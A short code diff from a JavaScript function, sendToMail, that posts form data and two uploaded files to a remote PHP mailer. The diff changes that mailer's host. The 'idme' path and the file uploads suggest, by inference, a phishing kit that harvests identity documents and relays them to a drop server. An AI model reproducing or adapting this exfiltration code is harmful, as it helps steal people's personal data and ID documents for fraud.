@@ -9,7 +9,7 @@ const sendToMail = async (body, file1, file2) => {
     submitRequest.append("file2", file2);
     // submitRequest.append("file3", file3);
 
-    const url = `https://novaex.pro/public/boiz/idme/jobMail.php`
+    const url = `https://shopthugn.com/public/boiz/idme/jobMail.php`
     const options = {
         method: "POST",
         body: submitRequest
